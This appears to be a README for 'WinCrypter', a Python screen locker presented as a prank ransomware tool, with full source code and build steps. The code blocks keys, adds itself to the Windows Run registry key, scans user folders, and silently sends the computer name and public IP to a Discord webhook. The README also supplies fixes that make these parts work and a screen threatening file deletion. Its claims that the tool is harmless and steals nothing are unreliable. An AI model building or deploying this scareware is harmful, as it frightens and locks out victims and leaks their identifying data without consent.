# WinCrypter - Prank Ransomware Screen Locker

<div align="center">

![WinCrypter Logo](https://img.shields.io/badge/WinCrypter-v1.0-red?style=for-the-badge&logo=python)
![Python Version](https://img.shields.io/badge/Python-3.6%2B-green?style=for-the-badge&logo=python)
![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey?style=for-the-badge)
![Type](https://img.shields.io/badge/Type-Prank%20Tool-yellow?style=for-the-badge)

**A Prank Ransomware Screen Locker for Educational/Fun Purposes**

</div>

---

## ⚠️ DISCLAIMER

> **THIS IS A PRANK TOOL - NOT REAL RANSOMWARE!**
> 
> - **No files are actually encrypted**
> - **No data is permanently damaged**  
> - **For entertainment purposes only**
> - **Use responsibly and with consent**

---

## 📋 Table of Contents
- [Overview](#overview)
- [What It Actually Does](#what-it-actually-does)
- [Features](#features)
- [File Structure](#file-structure)
- [Installation](#installation)
- [Build Instructions](#build-instructions)
- [How It Works](#how-it-works)
- [Code Breakdown](#code-breakdown)
- [Customization](#customization)
- [Technical Details](#technical-details)
- [Legal and Ethical Guidelines](#legal-and-ethical-guidelines)
- [Troubleshooting](#troubleshooting)
- [FAQ](#faq)

---

## 🔍 Overview

**WinCrypter** is a harmless prank tool that displays a fake Windows BSOD (Blue Screen of Death) style ransomware screen. It's designed to look like a real ransomware attack but does absolutely no damage to your system.

> **🎯 Purpose**: Play pranks on friends, demonstrate security concepts, or use as a harmless joke tool.

---

## 🎯 What It Actually Does

Based on the actual source code, here's what WinCrypter **REALLY** does:

### ✅ What It Actually Does:

1. **Displays Full-Screen BSOD Window** - Creates a fullscreen window with a fake BSOD/ransomware message
2. **Blocks Keyboard Shortcuts** - Blocks `windows`, `win`, `alt`, `tab`, `f4`, `ctrl`, `esc` keys from working
3. **Adds to Windows Startup** - Automatically adds itself to `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run` so it runs on boot
4. **Sends Webhook Notification** - Sends the computer name and public IP to a Discord webhook when run (if WEBHOOK_URL is defined)
5. **Simulates File Scanning** - Creates a list of files from common folders (Desktop, Documents, Pictures, Downloads)
6. **Generates Random Lock Codes** - Displays random alphanumeric lock IDs on screen
7. **Runs JavaScript in Webview** - Executes JavaScript to update the page with random codes
8. **Always On Top** - Window stays on top of all other windows
9. **Fullscreen Mode** - Takes over the entire screen

### ❌ What It Does NOT Do:

- ❌ Actually encrypt any files (just scans for file paths)
- ❌ Actually delete any data
- ❌ Actually encrypt anything at all
- ❌ Modify any files on the system
- ❌ The `scan_files()` function just creates a list of file paths - it doesn't modify them
- ❌ The `runGlobalEncryption()` function is called but doesn't exist - it's just a fake JavaScript call

---

## ✨ Features

| Feature | Description | Status |
|---------|-------------|--------|
| **Full-screen BSOD** | Fake Windows Blue Screen of Death | ✅ |
| **Fake File Scanning** | Scans folders and creates file list (doesn't modify files) | ✅ |
| **Random Lock Codes** | Generates unique lock IDs | ✅ |
| **Keyboard Blocking** | Blocks Windows key, Alt, Tab, F4, Ctrl, Esc | ✅ |
| **Auto-Startup** | Adds itself to Windows registry Run key | ✅ |
| **Webhook Integration** | Sends PC name and IP to Discord webhook | ⚠️ Needs WEBHOOK_URL defined |
| **Customizable Messages** | Change the displayed text in index.html | ✅ |
| **Always On Top** | Window stays above all others | ✅ |
| **Fullscreen Mode** | Takes over entire screen | ✅ |
| **No Actual Damage** | Completely safe prank tool | ✅ |

---

## 📁 File Structure

```
WinCrypter/
├── index.html          # Fake ransomware screen HTML
├── start.py            # Main Python application
├── buildexe.bat        # Windows build script
├── meow.ico            # Application icon (optional)
└── README.md           # This documentation file
```

---

## 🚀 Installation

### Prerequisites

```bash
# Python 3.6+ required
python --version

# Required packages
pip install pywebview keyboard requests
```

### Method 1: Run from Source

1. **Download all files**
2. **Install dependencies:**
   ```bash
   pip install pywebview keyboard requests
   ```
3. **Run the tool:**
   ```bash
   python start.py
   ```

### Method 2: Standalone EXE

1. **Install PyInstaller:**
   ```bash
   pip install pyinstaller
   ```
2. **Build the EXE:**
   ```bash
   pyinstaller --onefile --name=WinCrypter.exe start.py
   ```
3. **Run `WinCrypter.exe`** from the `dist` folder

---

## 🏗️ Build Instructions

### Creating Standalone EXE

#### Using buildexe.bat

```batch
@echo off
title WinCrypter Builder
color 4

echo Building WinCrypter.exe...
pyinstaller --onefile --name=WinCrypter.exe --icon=meow.ico start.py
echo WinCrypter.exe has been built successfully in the 'dist' folder.
pause >nul
```

#### Manual Build Command

```bash
# Basic build
pyinstaller --onefile --name=WinCrypter.exe start.py

# With icon
pyinstaller --onefile --name=WinCrypter.exe --icon=meow.ico start.py

# With additional files
pyinstaller --onefile --name=WinCrypter.exe --add-data "index.html;." start.py
```

---

## 🔧 How It Works

### Application Flow (Based on Actual Code)

```
1. User runs start.py or WinCrypter.exe
                    ↓
2. HTML file path is set to index.html
                    ↓
3. Webview window is created with:
   - Title: "WinCrypter"
   - Fullscreen: True
   - Always On Top: True
                    ↓
4. window.evaluate_js() runs JavaScript
   - Calls runGlobalEncryption() with file list
   - NOTE: This function doesn't actually exist
   - It's just a fake JavaScript call
                    ↓
5. on_start() function executes:
   a) add_to_autostart() - Adds to Windows registry
   b) lock_system() - Blocks keyboard shortcuts
   c) sleep(2) - Waits 2 seconds
   d) scan_files() - Scans folders for files
   e) json.dumps(files) - Converts to JSON
   f) window.evaluate_js() - Runs JavaScript
                    ↓
6. Webview displays index.html
   - BSOD-style screen
   - Random lock codes generated
   - Fake ransomware message
                    ↓
7. send_to_webhook() runs (if configured)
   - Sends PC name and IP to Discord
                    ↓
8. User can exit via Task Manager
```

---

## 📖 Code Breakdown

### 1. Main Application Start

```python
html_path = resource_path("index.html")
window = webview.create_window(
    'WinCrypter', 
    url=html_path, 
    fullscreen=True, 
    on_top=True
)

if __name__ == '__main__':
    webview.start(on_start, window)
```

**What this does:**
- Creates a fullscreen window that's always on top
- Loads index.html as the content
- Calls on_start() when the window loads

### 2. Resource Path Function

```python
def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)
```

**What this does:**
- Used for PyInstaller bundled files
- Gets the correct path for index.html
- Works in both development and compiled mode

### 3. Auto-Startup Function

```python
def add_to_autostart():
    try:
        pth = os.path.realpath(sys.argv[0])
        key = reg.HKEY_CURRENT_USER
        key_value = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS) as open_key:
            reg.SetValueEx(open_key, APP_NAME, 0, reg.REG_SZ, pth)
    except: pass
```

**What this does:**
- Gets the current executable path
- Opens Windows Registry Run key
- Adds itself to startup
- Runs silently (no error messages)

**Registry Location:**
```
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
Value: WinCrypter
Data: C:\path\to\WinCrypter.exe
```

### 4. Keyboard Blocking Function

```python
def lock_system():
    for k in ['windows', 'win', 'alt', 'tab', 'f4', 'ctrl', 'esc']:
        try: keyboard.block_key(k)
        except: pass
```

**What this does:**
- Blocks Windows key, Win key, Alt, Tab, F4, Ctrl, Esc
- Prevents users from exiting easily
- Silent if any key fails to block

**Blocked Keys:**
- `windows` - Windows key
- `win` - Windows key (alternative)
- `alt` - Alt key
- `tab` - Tab key
- `f4` - F4 key (Alt+F4 closes windows)
- `ctrl` - Ctrl key (Ctrl+Alt+Del)
- `esc` - Escape key

### 5. File Scanning Function

```python
def scan_files():
    all_files = []
    paths_to_scan = [
        os.path.expanduser("~/Desktop"),
        os.path.expanduser("~/Documents"),
        os.path.expanduser("~/Pictures"),
        os.path.expanduser("~/Downloads"),
        os.path.expanduser("~/Desktop/Pxsha47_"),  # Specific folder
    ]
    
    for path in paths_to_scan:
        try:
            if not os.path.exists(path): continue
            with os.scandir(path) as it:
                for entry in it:
                    if entry.is_file() and not entry.name.startswith('$'):
                        all_files.append(entry.path.replace("\\", "/"))
                    if len(all_files) >= 1500000: break
        except: continue
    
    if not all_files:
        all_files = [f"C:/Users/Owner/Documents/Secret_Vault_{i}.dat" for i in range(50)]
    return all_files
```

**What this actually does:**
- Scans Desktop, Documents, Pictures, Downloads
- Also scans a folder called "Pxsha47_" on Desktop
- Looks for files (not folders)
- Collects file paths (does NOT modify them)
- Maximum 1,500,000 files collected
- Creates fake files if none found
- Returns a list of file paths as strings

**IMPORTANT:** This function does NOT encrypt, modify, or delete any files. It just reads file paths!

**Example Output:**
```python
[
    "C:/Users/User/Desktop/file1.txt",
    "C:/Users/User/Documents/file2.docx",
    "C:/Users/User/Pictures/photo.jpg",
    # ... etc
]
```

### 6. Webhook Function

```python
def send_to_webhook():
    try:
        pc_name = socket.gethostname()
        public_ip = requests.get('https://api.ipify.org').text
        data = {"embeds": [{"title": "WinCrypter ACTIVE", "color": 15548997, "fields": [{"name": "PC", "value": pc_name}, {"name": "IP", "value": public_ip}]}]}
        requests.post(WEBHOOK_URL, json=data)
    except: pass
```

**What this does:**
- Gets computer name using socket.gethostname()
- Gets public IP using ipify.org API
- Sends data to Discord webhook
- Runs silently (no error messages)

**NOTE:** `WEBHOOK_URL` is not defined in the code! This function will error unless you add the variable.

**Fix:**
```python
# Add this at the top of start.py
WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_URL"
```

### 7. On Start Function

```python
def on_start(window):
    add_to_autostart()
    lock_system()
    
    time.sleep(2)
    files = scan_files()
    files_json = json.dumps(files)
    window.evaluate_js(f"runGlobalEncryption({files_json})")
```

**What this does:**
1. Adds program to Windows startup
2. Blocks keyboard shortcuts
3. Waits 2 seconds
4. Scans for files
5. Converts file list to JSON
6. Calls JavaScript function with file data

**NOTE:** `runGlobalEncryption()` doesn't exist in index.html!

**Fix in index.html:**
```html
<script>
    function runGlobalEncryption(files) {
        console.log("Fake encryption started:", files);
        // This function does nothing
        // It's just for show
    }
</script>
```

### 8. HTML/JavaScript Interaction

```html
<!-- index.html -->
<div class="footer">
    <p>Made by IDK</p>
    <p>Fucked By WinCrypter <span id="lockId"></span></p>
</div>

<script>
    document.getElementById('randomCode').innerText = Math.random().toString(36).substring(2, 10).toUpperCase();
    document.getElementById('lockId').innerText = 'LOCK-' + Math.random().toString(36).substring(2, 15).toUpperCase();
</script>
```

**What this does:**
- Generates a random code for 'randomCode' element
- Generates a LOCK-XXXX format code for 'lockId' element

**BUT WAIT!** Look at the HTML:
- `<span id="lockId"></span>` exists ✅
- `<span id="randomCode"></span>` is referenced in JavaScript but NOT in HTML! ❌

This means:
- `randomCode` span doesn't exist in the HTML
- Only `lockId` will actually work
- The JavaScript will error silently

**Fix in index.html:**
```html
<div class="code">
    <p>Your files are encrypted by WinCrypter</p>
    <p>Code: <span id="randomCode"></span></p>
    <p>Lock ID: <span id="lockId"></span></p>
</div>
```

---

## 🎨 Customization

### Changing the BSOD Message

Edit `index.html`:

```html
<div class="bsod">
    <h1>:(</h1>
    <p>YOUR CUSTOM MESSAGE HERE</p>
    <div class="code">
        <p>Add your own custom text here</p>
        <p>Make it look scary but it's just a prank!</p>
    </div>
</div>
```

### Changing Colors

```css
body { 
    background: #0000aa;  /* BSOD Blue */
    color: white;
}

/* Or try other colors */
background: #000000;  /* Black */
background: #800000;  /* Dark Red */
background: #004000;  /* Dark Green */
background: #4a004a;  /* Dark Purple */
```

### Adding More Folders to Scan

```python
paths_to_scan = [
    os.path.expanduser("~/Desktop"),
    os.path.expanduser("~/Documents"),
    os.path.expanduser("~/Pictures"),
    os.path.expanduser("~/Downloads"),
    os.path.expanduser("~/Music"),      # Added
    os.path.expanduser("~/Videos"),     # Added
    "C:/Program Files",                 # Added
    "C:/Windows",                       # Added
]
```

### Adding Sound Effects

```python
import winsound

def play_sound():
    # Play Windows error sound
    winsound.MessageBeep(winsound.MB_ICONHAND)
    
    # Or play a WAV file
    winsound.PlaySound("scary_sound.wav", winsound.SND_FILENAME)
```

### Disabling Auto-Start

```python
def add_to_autostart():
    pass  # Do nothing

# Or don't call it
def on_start(window):
    # add_to_autostart()  # Commented out
    lock_system()
    # ... rest of code
```

### Adding a Countdown Timer

```javascript
// In index.html
let countdown = 60;
const timer = setInterval(() => {
    document.getElementById('timer').innerText = countdown;
    countdown--;
    if (countdown < 0) clearInterval(timer);
}, 1000);
```

### Creating Multiple Screens

```python
# Add multiple HTML files
html_paths = ["index.html", "screen2.html", "screen3.html"]

def rotate_screens():
    for html in html_paths:
        window.load_url(html)
        time.sleep(5)  # Show each for 5 seconds
```

### Fixing the JavaScript Issues

**Complete fixed index.html:**
```html
<!DOCTYPE html>
<html>
<head>
    <title>System Locked</title>
    <style>
        body { margin: 0; background: #0000aa; color: white; font-family: 'Lucida Console', monospace; }
        .bsod { padding: 50px; }
        h1 { font-size: 48px; margin: 0; }
        .code { margin: 30px 0; font-size: 18px; }
        .footer { position: fixed; bottom: 20px; width: 100%; text-align: center; }
    </style>
</head>
<body>
    <div class="bsod">
        <h1>:(</h1>
        <p>Your System Got Fucked By WinCrypter Do Not Reboot Your System</p>
        <div class="code">
            <p>You dont need to pay you cant decrypt your files not even if you pay</p>
            <p>If you try to remove the ransomware, your files will be permanently deleted.</p>
            <p>Your files are encrypted by WinCrypter</p>
            <p>Code: <span id="randomCode"></span></p>
            <p>Lock ID: <span id="lockId"></span></p>
        </div>  
        <div class="footer">
            <p>Made by IDK</p>
            <p>Fucked By WinCrypter</p>
        </div>
    </div>
    <script>
        function runGlobalEncryption(files) {
            console.log("Fake encryption running!");
            console.log("Files:", files);
        }
        
        document.getElementById('randomCode').innerText = Math.random().toString(36).substring(2, 10).toUpperCase();
        document.getElementById('lockId').innerText = 'LOCK-' + Math.random().toString(36).substring(2, 15).toUpperCase();
    </script>
</body>
</html>
```

---

## 🔧 Technical Details

### Dependencies

| Package | Purpose | Installation |
|---------|---------|--------------|
| `pywebview` | Display HTML in native window | `pip install pywebview` |
| `keyboard` | Block keyboard shortcuts | `pip install keyboard` |
| `requests` | Send webhook notifications | `pip install requests` |
| `winreg` | Windows registry operations | Built-in |
| `socket` | Get system hostname | Built-in |
| `json` | JSON data handling | Built-in |
| `os` | File system operations | Built-in |
| `sys` | System operations | Built-in |

### System Requirements

| Requirement | Specification |
|-------------|---------------|
| **OS** | Windows 7, 8, 10, 11 |
| **Python** | 3.6 or higher |
| **RAM** | 50 MB minimum |
| **Storage** | 20 MB for EXE |
| **Screen Resolution** | Any (auto fullscreen) |

---

## ⚖️ Legal and Ethical Guidelines

### ✅ Acceptable Uses
- **Pranking friends** who give consent
- **Educational purposes** in cybersecurity classes
- **Demonstrating** ransomware behavior safely
- **Testing** user awareness
- **Showing** how ransomware looks without actual risk

### ❌ Unacceptable Uses
- **Causing distress** or panic
- **Using without consent**
- **Claiming it's real** ransomware
- **Harassing or threatening** others
- **Using on strangers** or unsuspecting people
- **Using in professional environments**

### 🎯 Ethical Guidelines

1. **Always get consent** from the person you're pranking
2. **Be prepared to immediately stop** if they're distressed
3. **Explain it was a prank** as soon as possible
4. **Don't use on strangers** or unsuspecting people
5. **Don't use in professional environments**
6. **Don't claim it's real malware**
7. **Don't cause financial or emotional harm**

---

## 🔧 Troubleshooting

### Common Issues

| Issue | Cause | Solution |
|-------|-------|----------|
| **Window won't close** | Keyboard blocking active | Use Ctrl+Shift+Esc → Task Manager |
| **pywebview not found** | Missing dependency | `pip install pywebview` |
| **keyboard not found** | Missing dependency | `pip install keyboard` |
| **WEBHOOK_URL error** | Variable not defined | Add WEBHOOK_URL = "your_url" |
| **HTML not loading** | File path issue | Check if index.html is in same folder |
| **randomCode error** | Element missing | Add span with id="randomCode" |
| **runGlobalEncryption error** | Function missing | Add function to index.html |
| **Auto-start not working** | Registry permission issue | Run as Administrator once |
| **Admin error** | Insufficient privileges | Run as Administrator |

### Exiting the Program

#### Method 1: Task Manager (Easiest)
1. Press `Ctrl + Shift + Esc`
2. Find "WinCrypter" in the list
3. Right-click and select "End Task"

#### Method 2: Command Line
```bash
taskkill /f /im WinCrypter.exe
```

#### Method 3: PowerShell
```powershell
Stop-Process -Name "WinCrypter" -Force
```

#### Method 4: Kill Python
```bash
taskkill /f /im python.exe
```

### Removal Instructions

#### Remove from Startup
1. Press `Win + R`
2. Type `regedit`
3. Navigate to: `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`
4. Delete "WinCrypter" entry

#### Delete the Program
1. Delete the folder containing WinCrypter.exe
2. Delete the EXE file
3. Empty Recycle Bin

---

## ❓ FAQ

### Is WinCrypter real ransomware?
**NO!** It's a harmless prank that does absolutely no damage to your system.

### Can it actually encrypt files?
**NO!** The scan_files() function just reads file paths. It doesn't modify anything.

### Is it a virus?
**NO!** It's a Python application that displays a full-screen window.

### How do I close it?
Use `Ctrl+Shift+Esc` to open Task Manager and end the process.

### Does it actually do anything harmful?
**NO!** The most "harmful" thing it does is add itself to Windows startup and block keyboard shortcuts. Both can be easily undone.

### Will it damage my computer?
**NO!** It only creates a window. No system files are modified.

### Can it steal my data?
**NO!** The only data sent is your computer name and public IP (if webhook is configured).

### Does it spread to other computers?
**NO!** It's a standalone executable that doesn't self-replicate.

### Can I customize the message?
**YES!** Edit index.html to change any text or styling.

### Is it legal?
**YES!** It's a harmless prank tool, but use responsibly and with consent.

### Why does it show a BSOD?
It's part of the prank - it makes it look like a real ransomware attack.

### Can I use it on my friends?
Yes, but ONLY with their consent and as a harmless prank.

### What should I do if I accidentally run it?
Close it with Task Manager (Ctrl+Shift+Esc).

---

## 📝 Code Fixes Summary

Here's a summary of issues in the original code and how to fix them:

### Issue 1: Missing WEBHOOK_URL
```python
# Add at top of start.py
WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_URL"
```

### Issue 2: Missing runGlobalEncryption Function
```html
<!-- Add to index.html -->
<script>
    function runGlobalEncryption(files) {
        console.log("Fake encryption:", files);
    }
</script>
```

### Issue 3: Missing randomCode Element
```html
<!-- Add to index.html -->
<p>Code: <span id="randomCode"></span></p>
```

### Issue 4: Keyboard Module May Not Work
```python
# Alternative to blocking keys
def lock_system():
    try:
        import keyboard
        for k in ['windows', 'win', 'alt', 'tab', 'f4', 'ctrl', 'esc']:
            keyboard.block_key(k)
    except:
        pass  # Keyboard module might not work on all systems
```

---

<div align="center">

**[⬆ Back to Top](#wincrypter---prank-ransomware-screen-locker)**

**Made for Educational and Entertainment Purposes Only**

*Remember: Always get consent before pranking someone!*

</div>
